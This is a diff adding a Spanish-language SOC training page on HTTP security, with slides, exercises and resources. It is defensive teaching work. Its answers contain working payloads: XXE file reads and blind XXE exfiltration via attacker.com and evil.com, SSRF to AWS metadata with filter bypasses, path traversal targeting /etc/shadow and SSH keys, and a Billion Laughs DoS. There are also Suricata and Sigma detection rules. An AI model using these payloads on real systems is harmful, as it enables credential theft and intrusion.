+          <p class="slide-subtitle" data-i18n="http.s12.sub">Entidades XML externas para leer archivos y hacer SSRF</p>
+          <p data-i18n="http.s12.p1">Si el parser XML del servidor no deshabilita entidades externas (XXE), el atacante puede definir entidades que apunten a archivos locales o URLs remotas. El servidor resuelve la entidad e incluye su contenido en la respuesta.</p>
+          <pre data-i18n="http.pre5">
+PAYLOAD XXE — File Read:
+  &lt;?xml version="1.0"?&gt;
+  &lt;!DOCTYPE foo [
+    &lt;!ENTITY xxe SYSTEM "file:///etc/passwd"&gt;
+  ]&gt;
+  &lt;root&gt;&lt;data&gt;&amp;xxe;&lt;/data&gt;&lt;/root&gt;
+  Response: root:x:0:0:root:/root:/bin/bash...
+
+PAYLOAD XXE — SSRF:
+  &lt;!ENTITY xxe SYSTEM "http://169.254.169.254/meta-data/"&gt;
+  → El servidor accede al metadata de AWS en nombre del atacante
+
+OUT-OF-BAND (Blind XXE):
+  &lt;!ENTITY % dtd SYSTEM "http://attacker.com/evil.dtd"&gt;
+  %dtd;
+  → El servidor contacta attacker.com → confirma la vulnerabilidad
+  → evil.dtd puede exfiltrar archivos via DNS o HTTP
+
+BILLION LAUGHS (DoS):
+  &lt;!ENTITY a "lol"&gt;
+  &lt;!ENTITY b "&amp;a;&amp;a;&amp;a;&amp;a;&amp;a;&amp;a;&amp;a;&amp;a;&amp;a;&amp;a;"&gt;
+  &lt;!ENTITY c "&amp;b;&amp;b;&amp;b;&amp;b;&amp;b;&amp;b;&amp;b;&amp;b;&amp;b;&amp;b;"&gt;
+  ... ×10 niveles → 10^10 expansiones → crash del parser
+
+MITIGACIÓN:
+  PHP:  libxml_disable_entity_loader(true)
+  Java: factory.setFeature("http://xml.org/sax/features/external-general-entities", false)
+  Python: defusedxml en lugar de xml.etree
+  .NET: XmlReaderSettings.DtdProcessing = DtdProcessing.Prohibit
+
+DETECCIÓN:
+  WAF: DOCTYPE, ENTITY, SYSTEM keywords en body XML
+  Logs: peticiones salientes inesperadas desde el servidor de app
+  SIEM: acceso a file:// o IPs internas desde la capa de aplicación</pre>
+          <p style="font-size:0.85rem;color:var(--text-secondary);">OWASP A05:2021 · MITRE ATT&CK: <strong>T1190</strong> — Exploit Public-Facing Application</p>
+        </div>
+
+      </div><!-- /slides-container -->
+<div class="slides-nav">
+        <button class="btn btn-secondary btn-prev" disabled data-i18n="btn.prev">← Anterior</button>
+        <div class="slides-progress"></div>
+        <button class="btn btn-primary btn-next" data-i18n="btn.next">Siguiente →</button>
+      </div>
+    </div><!-- /tab teoria -->
+
+    <!-- ── Tab: Ejercicios ── -->
+    <div class="tab-content" data-tab="ejercicios">
+      <div class="ejercicios-list">
+
+        <div class="ejercicio-card">
+          <div class="ejercicio-header">
+            <span class="ejercicio-number">EJ-01</span>
+            <span class="ejercicio-title" data-i18n="http.ej1.title">HTTP vs HTTPS — ¿qué cambia realmente?</span>
+            <span class="ejercicio-difficulty dif-easy" data-i18n="ej.easy">Fácil</span>
+          </div>
+          <div class="ejercicio-body">
+            <p data-i18n="http.ej1.q"></p>
+            <button class="respuesta-toggle" data-i18n="btn.showAnswer">🔍 Ver respuesta</button>
+            <div class="respuesta-box" data-i18n="http.ej1.ans">
+Sobre HTTP plano un atacante en MITM puede ver:
+- Credenciales (usuario/contraseña) en texto plano en el body del POST
+- Cookies de sesión en headers → robo de sesión
+- Todos los datos del formulario sin cifrar
+- URLs visitadas (historial de navegación)
+- Contenido completo de las páginas
+
+Sobre HTTPS el atacante solo ve:
+- El hostname del servidor (en el SNI del TLS handshake)
+- El tamaño aproximado del tráfico
+- Los tiempos de conexión
+NO puede ver: credenciales, cookies, URLs exactas, ni contenido.
+
+Riesgo adicional HTTP: modificación del contenido en tránsito
+→ inyección de scripts maliciosos en páginas (MITM activo).
+            </div>
+          </div>
+        </div>
+
+        <div class="ejercicio-card">
+          <div class="ejercicio-header">
+            <span class="ejercicio-number">EJ-02</span>
+            <span class="ejercicio-title" data-i18n="http.ej2.title">Identifica el tipo de XSS</span>
+            <span class="ejercicio-difficulty dif-easy" data-i18n="ej.easy">Fácil</span>
+          </div>
+          <div class="ejercicio-body">
+            <p data-i18n="http.ej2.q"></p>
+            <button class="respuesta-toggle" data-i18n="btn.showAnswer">🔍 Ver respuesta</button>
+            <div class="respuesta-box" data-i18n="http.ej2.ans">
+REFLECTED XSS:
+- El payload está en la URL o parámetro de la request
+- Solo afecta al usuario que hace click en el enlace malicioso
+- Ejemplo: https://site.com/search?q=&lt;script&gt;alert(1)&lt;/script&gt;
+- El atacante envía ese link por email/phishing
+
+STORED XSS (más peligroso):
+- El payload se guarda en la base de datos del servidor
+- Afecta a TODOS los usuarios que visiten la página
+- Ejemplo: publicar un comentario con &lt;script&gt;...&lt;/script&gt;
+  → cada usuario que vea ese comentario ejecuta el script
+- Un solo payload puede robar sesiones de miles de usuarios
+- Puede persistir indefinidamente hasta que se limpie la DB
+
+STORED es más peligroso porque:
+→ No requiere que la víctima haga click en nada especial
+→ Escala a todos los usuarios automáticamente
+→ Puede inyectarse una sola vez y afectar durante días/semanas
+            </div>
+          </div>
+        </div>
+
+        <div class="ejercicio-card">
+          <div class="ejercicio-header">
+            <span class="ejercicio-number">EJ-03</span>
+            <span class="ejercicio-title" data-i18n="http.ej3.title">Análisis de log HTTP — ¿qué ves?</span>
+            <span class="ejercicio-difficulty dif-medium" data-i18n="ej.medium">Medio</span>
+          </div>
+          <div class="ejercicio-body">
+            <p data-i18n="http.ej3.q"></p>
+            <pre>
+10:14:02  GET /login?user=admin HTTP/1.1 → 200
+10:14:03  GET /login?user=admin'-- HTTP/1.1 → 500
+10:14:04  GET /login?user=admin'+OR+'1'='1 HTTP/1.1 → 200
+10:14:05  GET /login?user=1'+UNION+SELECT+null,table_name+FROM+information_schema.tables-- HTTP/1.1 → 500
+10:14:06  GET /login?user=1'+UNION+SELECT+null,username+FROM+users-- HTTP/1.1 → 200
+User-Agent: sqlmap/1.7.8#stable (https://sqlmap.org)</pre>
+            <button class="respuesta-toggle" data-i18n="btn.showAnswer">🔍 Ver respuesta</button>
+            <div class="respuesta-box" data-i18n="http.ej3.ans">
+ATAQUE: SQL Injection automatizado con sqlmap
+
+Evidencia:
+1. User-Agent: "sqlmap/1.7.8" → herramienta de SQLi automatizada, no es un usuario real
+2. Secuencia de payloads progresivos:
+   - Prueba básica (admin'--)  → error 500 (confirma vulnerabilidad)
+   - Bypass auth (OR '1'='1') → 200 (login exitoso sin contraseña)
+   - UNION SELECT para enumerar tablas → 500 (número de columnas incorrecto)
+   - UNION SELECT para extraer users → 200 (¡datos extraídos!)
+3. Velocidad: 5 requests en 4 segundos → automatizado
+
+Primer paso de respuesta:
+→ BLOQUEAR la IP origen en el WAF/firewall inmediatamente
+→ Verificar qué datos se extrajeron (log de response body)
+→ Determinar si el usuario 'admin' fue comprometido
+→ Escalar a Tier 2, abrir ticket de incidente
+→ Revisar si sqlmap obtuvo credenciales (riesgo de escalada)
+            </div>
+          </div>
+        </div>
+
+        <div class="ejercicio-card">
+          <div class="ejercicio-header">
+            <span class="ejercicio-number">EJ-04</span>
+            <span class="ejercicio-title" data-i18n="http.ej4.title">Headers de seguridad HTTP — auditoría</span>
+            <span class="ejercicio-difficulty dif-medium" data-i18n="ej.medium">Medio</span>
+          </div>
+          <div class="ejercicio-body">
+            <p data-i18n="http.ej4.q"></p>
+            <pre>
+HTTP/1.1 200 OK
+Content-Type: text/html
+Set-Cookie: session=abc123
+Server: Apache/2.4.51
+X-Powered-By: PHP/7.4.3</pre>
+            <button class="respuesta-toggle" data-i18n="btn.showAnswer">🔍 Ver respuesta</button>
+            <div class="respuesta-box" data-i18n="http.ej4.ans">
+HEADERS AUSENTES O MAL CONFIGURADOS:
+
+1. Set-Cookie: session=abc123
+   ❌ Falta: HttpOnly → cookie accesible por JS → XSS puede robarla
+   ❌ Falta: Secure → enviada por HTTP también → MITM la ve
+   ❌ Falta: SameSite=Strict → vulnerable a CSRF
+   ✅ Correcto: Set-Cookie: session=abc123; HttpOnly; Secure; SameSite=Strict
+
+2. Falta: Strict-Transport-Security (HSTS)
+   → Sin esto: posible downgrade a HTTP
+   ✅ Agregar: Strict-Transport-Security: max-age=31536000; includeSubDomains
+
+3. Falta: X-Frame-Options o frame-ancestors en CSP
+   → Sin esto: clickjacking posible
+   ✅ Agregar: X-Frame-Options: DENY
+
+4. Falta: Content-Security-Policy
+   → Sin esto: XSS puede cargar scripts externos
+   ✅ Agregar: Content-Security-Policy: default-src 'self'
+
+5. Server: Apache/2.4.51 + X-Powered-By: PHP/7.4.3
+   ⚠️ Information disclosure: expone versiones específicas
+   → Un atacante busca CVEs para esas versiones exactas
+   ✅ Remover o cambiar: Server: webserver / X-Powered-By: (eliminar)
+            </div>
+          </div>
+        </div>
+
+        <div class="ejercicio-card">
+          <div class="ejercicio-header">
+            <span class="ejercicio-number">EJ-05</span>
+            <span class="ejercicio-title" data-i18n="http.ej5.title">Escribí la regla WAF/Suricata</span>
+            <span class="ejercicio-difficulty dif-hard" data-i18n="ej.hard">Difícil</span>
+          </div>
+          <div class="ejercicio-body">
+            <p data-i18n="http.ej5.q"></p>
+            <button class="respuesta-toggle" data-i18n="btn.showAnswer">🔍 Ver respuesta</button>
+            <div class="respuesta-box" data-i18n="http.ej5.ans">
+# Regla Suricata — XSS Detection en GET params
+alert http any any -> $HTTP_SERVERS any (
+  msg:"ET WEB XSS Attempt in URI - script tag";
+  flow:established,to_server;
+  http.uri;
+  pcre:"/((\%3C)|<)((\%2F)|\/)*[a-z0-9\%]+((\%3E)|>)/i";
+  threshold: type limit, track by_src, count 3, seconds 30;
+  classtype:web-application-attack;
+  metadata:affected_product Web_Server, attack_target Server;
+  sid:2100050;
+  rev:2;
+)
+
+# Regla adicional — sqlmap User-Agent
+alert http any any -> $HTTP_SERVERS any (
+  msg:"ET SCAN sqlmap Automated SQL Injection Tool";
+  flow:established,to_server;
+  http.user_agent;
+  content:"sqlmap"; nocase;
+  classtype:web-application-activity;
+  sid:2100051;
+  rev:1;
+)
+
+# Regla Sigma — múltiples 500 desde misma IP (fuzzing/SQLi)
+title: HTTP 500 Error Spike - Possible SQLi
+detection:
+  selection:
+    http.status_code: 500
+  timeframe: 1m
+  condition: selection | count() by src_ip > 10
+level: medium
+            </div>
+          </div>
+        </div>
+
+        <!-- Mini Challenge -->
+        <div class="mini-challenge">
+          <div class="challenge-label" data-i18n="ej.challenge">🚨 Mini-Challenge · Resolver el incidente</div>
+          <h3 data-i18n="http.challenge.title">Incidente #HTTP-001: "La tienda que regalaba cuentas"</h3>
+          <p style="color:var(--text-secondary);font-size:0.9rem;margin-bottom:1rem;" data-i18n="http.challenge.context">
+            Son las 2 AM. El SIEM dispara una alerta: 847 requests con status 200 hacia <code>/api/users</code> en los últimos 10 minutos desde la IP <code>45.129.56.200</code>. El endpoint normalmente devuelve el perfil del usuario autenticado. Logs del proxy:
+          </p>
+          <pre style="font-size:0.78rem;margin-bottom:1rem;" data-i18n="http.pre8">
+02:14:01  GET /api/users?id=1  → 200  {"id":1,"email":"admin@corp.com","role":"admin"}
+02:14:02  GET /api/users?id=2  → 200  {"id":2,"email":"user2@corp.com","role":"user"}
+02:14:03  GET /api/users?id=3  → 200  {"id":3,"email":"user3@corp.com","role":"user"}
+...
+02:24:09  GET /api/users?id=847 → 200 {"id":847,"email":"user847@corp.com","role":"user"}
+User-Agent: python-requests/2.28.0
+Authorization: Bearer eyJhbGc...  (token de usuario legítimo #1042)</pre>
+
+          <div class="ejercicio-card" style="border-color:var(--proto-color);margin-top:0;">
+            <div class="ejercicio-header">
+              <span class="ejercicio-number">CHALLENGE</span>
+              <span class="ejercicio-title" data-i18n="http.challenge.q">¿Qué pasó? ¿Cómo respondés?</span>
+              <span class="ejercicio-difficulty dif-hard" data-i18n="ej.hard">Difícil</span>
+            </div>
+            <div class="ejercicio-body">
+              <p data-i18n="http.challenge.instructions"></p>
+              <button class="respuesta-toggle" data-i18n="btn.showAnswer">🔍 Ver análisis completo</button>
+              <div class="respuesta-box" data-i18n="http.challenge.ans">
+(1) VULNERABILIDAD: IDOR (Insecure Direct Object Reference) — OWASP A01:2021
+    TÉCNICA: Enumeration / Mass Data Harvesting
+    El endpoint /api/users?id=N devuelve datos de CUALQUIER usuario si
+    estás autenticado, sin verificar que el ?id sea el tuyo.
+    El atacante tiene un token legítimo (robado o creado) y enumera
+    todos los IDs secuencialmente con un script Python.
+
+(2) IMPACTO:
+    - 847 emails corporativos expuestos
+    - Roles de usuarios expuestos (incluyendo admins)
+    - Posible preparación para phishing dirigido o credential stuffing
+    - Violación de privacidad → potencial obligación de notificación GDPR/legal
+
+(3) RESPUESTA INMEDIATA:
+    → Bloquear IP 45.129.56.200 en firewall
+    → Invalidar el token Bearer comprometido (logout forzado del usuario #1042)
+    → Verificar si el usuario #1042 fue comprometido o es el atacante
+    → Preservar logs completos para investigación
+    → Notificar al equipo de desarrollo para parchear el endpoint
+    → Evaluar si hay otros endpoints IDOR con el mismo patrón
+    → Abrir ticket legal/privacidad por datos expuestos
+
+(4) PREVENCIÓN:
+    → Authorization check: verificar que el id del token == id solicitado
+    → Rate limiting en la API: máximo N requests/minuto por token
+    → Usar UUIDs en lugar de IDs secuenciales (dificulta enumeración)
+    → Logging + alertas para acceso masivo a recursos de otros usuarios
+    → API security testing en el pipeline CI/CD (OWASP API Top 10)
+              </div>
+            </div>
+          </div>
+        </div>
+
+
+        <div class="ejercicio-card">
+          <div class="ejercicio-header">
+            <span class="ejercicio-number">EJ-06</span>
+            <span class="ejercicio-title" data-i18n="http.ej6.title">SSRF: accede al metadata de AWS</span>
+            <span class="ejercicio-difficulty dif-hard" data-i18n="ej.hard">Difícil</span>
+          </div>
+          <div class="ejercicio-body">
+            <p data-i18n="http.ej6.q">Una aplicación tiene el endpoint <code>/fetch?url=</code> que descarga imágenes remotas. ¿Cómo usarías SSRF para obtener credenciales IAM de AWS? ¿Qué URL enviarías exactamente? ¿Cómo bypassearías un filtro que bloquea "169.254.169.254"? ¿Qué detectarías en los logs del WAF/SIEM?</p>
+            <button class="respuesta-toggle" data-i18n="btn.showAnswer">🔍 Ver respuesta</button>
+            <div class="respuesta-box" data-i18n="http.ej6.ans">
+PAYLOAD BÁSICO:
+  GET /fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/
+
+RESPUESTA ESPERADA:
+  {"AccessKeyId":"ASIA...","SecretAccessKey":"...","Token":"...","Expiration":"..."}
+
+BYPASSES DE FILTRO (si bloquean "169.254.169.254"):
+  • Decimal:     http://2852039166/latest/meta-data/
+  • Hex:         http://0xa9fea9fe/latest/meta-data/
+  • IPv6:        http://[::ffff:169.254.169.254]/latest/meta-data/
+  • DNS rebind:  apuntar evil.com → 169.254.169.254 con TTL=1s
+  • Redirección: http://evil.com/redir → Location: http://169.254.169.254/...
+
+DETECCIÓN EN LOGS:
+  • Petición saliente de servidor de app hacia 169.254.x.x
+  • User-Agent: el del servidor (Python-urllib, Java/1.8, etc.)
+  • Timing: respuesta muy rápida (red interna)
+  • SIEM: alert "outbound request to cloud metadata from app server"
+  • CloudTrail: AssumeRole usando credenciales EC2 desde IP externa
+            </div>
+          </div>
+        </div>
+
+        <div class="ejercicio-card">
+          <div class="ejercicio-header">
+            <span class="ejercicio-number">EJ-07</span>
+            <span class="ejercicio-title" data-i18n="http.ej7.title">Path Traversal / LFI: leer /etc/passwd</span>
+            <span class="ejercicio-difficulty dif-medium" data-i18n="ej.medium">Medio</span>
+          </div>
+          <div class="ejercicio-body">
+            <p data-i18n="http.ej7.q">Una app tiene el endpoint <code>/download?file=report.pdf</code>. ¿Qué payloads de Path Traversal probarías para leer <code>/etc/passwd</code>? ¿Cómo bypassearías un filtro que remueve <code>../</code>? ¿Qué archivos son más valiosos en un pentest real? ¿Cómo detectarías esto en logs de acceso Apache/Nginx?</p>
+            <button class="respuesta-toggle" data-i18n="btn.showAnswer">🔍 Ver respuesta</button>
+            <div class="respuesta-box" data-i18n="http.ej7.ans">
+PAYLOADS BÁSICOS:
+  /download?file=../../../../etc/passwd
+  /download?file=../../../etc/shadow
+
+BYPASSES:
+  • Doble encode: %252e%252e%252f%252e%252e%252f = ../../
+  • Null byte:    ../../../../etc/passwd%00.pdf  (PHP <5.3)
+  • Unicode:      ..%c0%af..%c0%af = ../..  (IIS antiguo)
+  • Strip bypass: ....//....//etc/passwd  (el filtro elimina "../" → queda "../")
+
+ARCHIVOS OBJETIVO:
+  Linux: /etc/passwd, /etc/shadow, /proc/self/environ, /proc/self/cmdline
+         ~/.ssh/id_rsa, /var/www/html/.env, /etc/nginx/nginx.conf
+  Windows: C:\Windows\win.ini, C:\inetpub\wwwroot\web.config
+
+DETECCIÓN EN LOGS:
+  • access.log: GET /download?file=../../../../etc/passwd → 200 OK
+  • Buscar: "%2e%2e", "../", "..%2F", "%252e" en parámetros de query
+  • SIEM: rule "path_traversal" · umbral: >5 intentos/min desde misma IP
+  • Zeek http.log: uri contains "../" o "%2e%2e"
+            </div>
+          </div>
+        </div>
+
+        <div class="ejercicio-card">
+          <div class="ejercicio-header">
+            <span class="ejercicio-number">EJ-08</span>
+            <span class="ejercicio-title" data-i18n="http.ej8.title">XXE: extrae /etc/hostname via DOCTYPE</span>
+            <span class="ejercicio-difficulty dif-hard" data-i18n="ej.hard">Difícil</span>
+          </div>
+          <div class="ejercicio-body">
+            <p data-i18n="http.ej8.q">Una API acepta XML en el body. Escribí un payload XXE que lea <code>/etc/hostname</code>. ¿Cómo harías un XXE ciego (sin respuesta visible)? ¿Qué parser XML es vulnerable por defecto? ¿Cómo mitigas XXE en Java y Python?</p>
+            <button class="respuesta-toggle" data-i18n="btn.showAnswer">🔍 Ver respuesta</button>
+            <div class="respuesta-box" data-i18n="http.ej8.ans">
+PAYLOAD XXE CLÁSICO:
+  &lt;?xml version="1.0"?&gt;
+  &lt;!DOCTYPE foo [
+    &lt;!ENTITY xxe SYSTEM "file:///etc/hostname"&gt;
+  ]&gt;
+  &lt;root&gt;&lt;data&gt;&amp;xxe;&lt;/data&gt;&lt;/root&gt;
+
+BLIND XXE (sin respuesta visible):
+  &lt;!DOCTYPE foo [
+    &lt;!ENTITY % remote SYSTEM "http://evil.com/xxe.dtd"&gt;
+    %remote;
+  ]&gt;
+  xxe.dtd contiene: &lt;!ENTITY % data SYSTEM "file:///etc/passwd"&gt;
+                    &lt;!ENTITY % out "...%data;..."&gt;
+  Exfiltración via DNS o HTTP a servidor del atacante
+
+PARSERS VULNERABLES POR DEFECTO:
+  • Java: DocumentBuilderFactory, SAXParser
+  • Python: xml.etree.ElementTree, lxml (sin DTD disable)
+  • PHP: SimpleXML, DOMDocument
+
+MITIGACIONES:
+  Java:   factory.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true)
+  Python: defusedxml.ElementTree.parse(...)  # usar defusedxml
+  .NET:   XmlReaderSettings { DtdProcessing = DtdProcessing.Prohibit }
+  General: deshabilitar DTDs + entidades externas en el parser
+            </div>
+          </div>
+        </div>
+
+      </div><!-- /ejercicios-list -->
+    </div><!-- /tab ejercicios -->
+
+    <!-- ── Tab: Recursos ── -->
+    <div class="tab-content" data-tab="recursos">
+
+      <div class="section-title" data-i18n="rec.official">📄 Documentación Oficial</div>
+      <div class="recursos-grid mb-3">
+        <div class="recurso-card">
+          <div class="recurso-type">RFC</div>
+          <h4>RFC 9110 — HTTP Semantics (2022)</h4>
+          <p data-i18n="http.rec.rfc9110">Especificación actualizada de HTTP: métodos, status codes, headers y semántica. Reemplaza RFC 7230-7235.</p>
+          <a class="recurso-link" href="https://www.rfc-editor.org/rfc/rfc9110" target="_blank" rel="noopener">→ rfc-editor.org/rfc/rfc9110</a>
+        </div>
+        <div class="recurso-card">
+          <div class="recurso-type">OWASP</div>
+          <h4>OWASP Top 10 — 2021</h4>
+          <p data-i18n="http.rec.owasp">Los 10 riesgos más críticos en aplicaciones web. A03 Injection, A07 Auth failures, A10 SSRF cubiertos en este módulo.</p>
+          <a class="recurso-link" href="https://owasp.org/Top10/" target="_blank" rel="noopener">→ owasp.org/Top10</a>
+        </div>
+        <div class="recurso-card">
+          <div class="recurso-type">OWASP</div>
+          <h4>OWASP Testing Guide v4.2</h4>
+          <p data-i18n="http.rec.otg">Metodología completa para testing de seguridad web. Secciones específicas para SQLi, XSS, SSRF, LFI, XXE.</p>
+          <a class="recurso-link" href="https://owasp.org/www-project-web-security-testing-guide/" target="_blank" rel="noopener">→ owasp.org/www-project-web-security-testing-guide</a>
+        </div>
+        <div class="recurso-card">
+          <div class="recurso-type">PortSwigger</div>
+          <h4>Web Security Academy</h4>
+          <p data-i18n="http.rec.portswigger">Laboratorios gratuitos de PortSwigger (creadores de Burp Suite) para SQLi, XSS, SSRF, Path Traversal, XXE y más.</p>
+          <a class="recurso-link" href="https://portswigger.net/web-security" target="_blank" rel="noopener">→ portswigger.net/web-security</a>
+        </div>
+      </div>
+
+      <div class="section-title" data-i18n="rec.tools">🛠️ Herramientas SOC</div>
+      <div class="recursos-grid mb-3">
+        <div class="recurso-card">
+          <div class="recurso-type" data-i18n="rec.type.tool.proxy">Herramienta · Proxy</div>
+          <h4>Burp Suite Community</h4>
+          <p data-i18n="http.rec.burp">Proxy de interceptación para análisis de tráfico HTTP/HTTPS. Incluye scanner pasivo, Repeater y Intruder.</p>
+          <pre style="font-size:0.78rem;margin-top:0.5rem;"># Configurar proxy en browser:
+# HTTP Proxy: 127.0.0.1:8080
+# Interceptar → Forward → Modify
+# Repeater: reusar y modificar requests</pre>
+        </div>
+        <div class="recurso-card">
+          <div class="recurso-type" data-i18n="rec.type.tool.nsm">Herramienta · NSM</div>
+          <h4>Zeek — http.log</h4>
+          <p data-i18n="http.rec.zeek">Campos clave para análisis HTTP en Zeek.</p>
+          <pre style="font-size:0.78rem;margin-top:0.5rem;">zeek-cut ts method host uri status_code user_agent
+# SQLi / path traversal:
+grep -E "(union|select|%2e%2e|\.\.\/)" http.log
+# Spike de 500:
+zeek-cut status_code | grep "^5" | wc -l</pre>
+        </div>
+        <div class="recurso-card">
+          <div class="recurso-type" data-i18n="rec.type.tool.cli">Herramienta · CLI</div>
+          <h4>curl — pruebas HTTP</h4>
+          <p data-i18n="http.rec.curl">Cliente HTTP de línea de comandos para pruebas manuales de endpoints.</p>
+          <pre style="font-size:0.78rem;margin-top:0.5rem;">curl -v https://target.com
+curl -I https://target.com          # solo headers
+curl -X POST -d @payload.xml \
+  -H "Content-Type: text/xml" URL   # XXE
+curl -H "Cookie: session=abc" URL</pre>
+        </div>
+        <div class="recurso-card">
+          <div class="recurso-type" data-i18n="rec.type.tool.testing">Herramienta · Lab</div>
+          <h4>OWASP Juice Shop</h4>
+          <p data-i18n="http.rec.dvwa">Aplicación web intencionalmente vulnerable. Práctica guiada de SQLi, XSS, SSRF, Path Traversal, XXE y más de 100 retos.</p>
+          <a class="recurso-link" href="https://owasp.org/www-project-juice-shop/" target="_blank" rel="noopener">→ owasp.org/www-project-juice-shop</a>
+        </div>
+      </div>
+
+      <div class="section-title" data-i18n="rec.cves">⚡ CVEs y Vulnerabilidades Relevantes</div>
+      <div class="recursos-grid mb-3">
+        <div class="recurso-card">
+          <div class="recurso-type" data-i18n="rec.type.cve.crit">CVE · Crítico</div>
+          <h4>CVE-2021-44228 — Log4Shell</h4>
+          <p data-i18n="http.rec.log4shell">JNDI injection via headers HTTP (User-Agent, X-Forwarded-For). RCE sin autenticación. CVSS 10.0. Afectó millones de servicios Java.</p>
+          <a class="recurso-link" href="https://nvd.nist.gov/vuln/detail/CVE-2021-44228" target="_blank" rel="noopener">→ NVD CVE-2021-44228</a>
+        </div>
+        <div class="recurso-card">
+          <div class="recurso-type" data-i18n="rec.type.cve.crit">CVE · Crítico</div>
+          <h4>CVE-2021-26084 — Confluence OGNL</h4>
+          <p data-i18n="http.rec.confluence">Inyección OGNL en Confluence Server. SSRF + RCE via parámetros HTTP. Explotado activamente en 2021.</p>
+          <a class="recurso-link" href="https://nvd.nist.gov/vuln/detail/CVE-2021-26084" target="_blank" rel="noopener">→ NVD CVE-2021-26084</a>
+        </div>
+        <div class="recurso-card">
+          <div class="recurso-type" data-i18n="rec.type.cve.high">CVE · Alto</div>
+          <h4>CVE-2019-11043 — PHP-FPM LFI/RCE</h4>
+          <p data-i18n="http.rec.phpfpm">Path traversal en PHP-FPM con Nginx. Permite LFI → RCE en configuraciones comunes. CVSS 9.8.</p>
+          <a class="recurso-link" href="https://nvd.nist.gov/vuln/detail/CVE-2019-11043" target="_blank" rel="noopener">→ NVD CVE-2019-11043</a>
+        </div>
+        <div class="recurso-card">
+          <div class="recurso-type" data-i18n="rec.type.cve.high">CVE · Alto</div>
+          <h4>CVE-2019-0230 — Apache Struts OGNL</h4>
+          <p data-i18n="http.rec.struts">Doble evaluación OGNL en Apache Struts 2. XXE + RCE a través de parámetros HTTP. Familia de CVEs que incluye el famoso Equifax breach.</p>
+          <a class="recurso-link" href="https://nvd.nist.gov/vuln/detail/CVE-2019-0230" target="_blank" rel="noopener">→ NVD CVE-2019-0230</a>
+        </div>
+      </div>
+
+      <div class="section-title" data-i18n="rec.cheatsheet">📋 Cheatsheet HTTP para SOC</div>
+      <div class="cheatsheet-table-wrap">
+        <table class="cheatsheet-table">
+          <thead>
+            <tr>
+              <th data-i18n="dns.cheat.signal">Señal</th>
+              <th data-i18n="dns.cheat.cause">Posible causa</th>
+              <th data-i18n="dns.cheat.action">Acción</th>
+            </tr>
+          </thead>
+          <tbody>
+            <tr><td data-i18n="http.cheat.r1a">UNION/SELECT en URI o body</td><td>SQL Injection</td><td data-i18n="http.cheat.r1c">Bloquear IP, revisar BD, WAF rule</td></tr>
+            <tr><td data-i18n="http.cheat.r2a">%2e%2e o ../ en query params</td><td>Path Traversal / LFI</td><td data-i18n="http.cheat.r2c">Bloquear, auditar archivos accedidos</td></tr>
+            <tr><td data-i18n="http.cheat.r3a">DOCTYPE / SYSTEM en body XML</td><td>XXE</td><td data-i18n="http.cheat.r3c">Deshabilitar DTD en parser, alerta SIEM</td></tr>
+            <tr><td data-i18n="http.cheat.r4a">Request saliente a 169.254.x.x desde app</td><td>SSRF → metadata cloud</td><td data-i18n="http.cheat.r4c">Alertar inmediato, revisar CloudTrail</td></tr>
+            <tr><td data-i18n="http.cheat.r5a">Spike de 403/404 en /admin, /.env</td><td data-i18n="http.cheat.r5b">Reconocimiento / fuzzing</td><td data-i18n="http.cheat.r5c">Rate limit, bloquear rango IP, revisar UA</td></tr>
+            <tr><td data-i18n="http.cheat.r6a">&lt;script&gt; en parámetros GET/POST</td><td>XSS attempt</td><td data-i18n="http.cheat.r6c">WAF rule, revisar CSP headers</td></tr>
+            <tr><td>User-Agent: sqlmap, nikto, dirbuster</td><td data-i18n="http.cheat.r7b">Escaneo automatizado</td><td data-i18n="http.cheat.r7c">Bloquear UA, alertar SOC</td></tr>
+          </tbody>
+        </table>
+      </div>
+
+      <div class="section-title mt-3" data-i18n="rec.labs">🎯 Labs Externos Recomendados</div>
+      <div class="recursos-grid">
+        <div class="recurso-card">
+          <div class="recurso-type">PortSwigger</div>
+          <h4>SSRF Labs — PortSwigger Academy</h4>
+          <p data-i18n="http.rec.lab.ssrf">Laboratorios de SSRF básico, ciego, bypass de filtros y SSRF via redirección. Gratuitos.</p>
+          <a class="recurso-link" href="https://portswigger.net/web-security/ssrf" target="_blank" rel="noopener">→ portswigger.net/web-security/ssrf</a>
+        </div>
+        <div class="recurso-card">
+          <div class="recurso-type">PortSwigger</div>
+          <h4>XXE Labs — PortSwigger Academy</h4>
+          <p data-i18n="http.rec.lab.xxe">Laboratorios de XXE clásico, ciego y via XInclude. Incluye explotación a SSRF via XXE.</p>
+          <a class="recurso-link" href="https://portswigger.net/web-security/xxe" target="_blank" rel="noopener">→ portswigger.net/web-security/xxe</a>
+        </div>
+        <div class="recurso-card">
+          <div class="recurso-type">MITRE ATT&amp;CK</div>
+          <h4>T1190 — Exploit Public-Facing Application</h4>
+          <p data-i18n="http.rec.t1190">Técnica principal para explotación de aplicaciones web. SQLi, XSS, SSRF, LFI y XXE caen bajo esta técnica.</p>
+          <a class="recurso-link" href="https://attack.mitre.org/techniques/T1190/" target="_blank" rel="noopener">→ attack.mitre.org/T1190</a>
+        </div>
+        <div class="recurso-card">
+          <div class="recurso-type">MITRE ATT&amp;CK</div>
+          <h4>T1552.005 — Cloud Instance Metadata API</h4>
+          <p data-i18n="http.rec.t1552">Acceso a metadata de instancias cloud via SSRF. Robo de credenciales IAM temporales en AWS, Azure y GCP.</p>
+          <a class="recurso-link" href="https://attack.mitre.org/techniques/T1552/005/" target="_blank" rel="noopener">→ attack.mitre.org/T1552/005</a>
+        </div>
+        <div class="recurso-card">
+          <div class="recurso-type">TryHackMe</div>
+          <h4>OWASP Top 10 Room</h4>
+          <p data-i18n="http.rec.thm">Room de TryHackMe con desafíos prácticos de cada vulnerabilidad OWASP Top 10 incluyendo XXE y SSRF.</p>
+          <a class="recurso-link" href="https://tryhackme.com/room/owasptop10" target="_blank" rel="noopener">→ tryhackme.com/room/owasptop10</a>
+        </div>
+      </div>
+
+    </div><!-- /tab recursos -->
+
+  </main>
+
+  <script src="../shared.js"></script>
+  <script src="../i18n-core.js"></script>
+  <script src="../i18n-http.js"></script>
+  <script src="../theme-switcher.js"></script>
+  <script src="app.js"></script>
+  <script>
+    document.addEventListener('DOMContentLoaded', () => {
+      SOC.initSlides('http-slides');
+      SOC.initEjercicios();
+      SOC.saveProgress('http', 'demo');
+    });
+  </script>
+
+</body>
+</html>
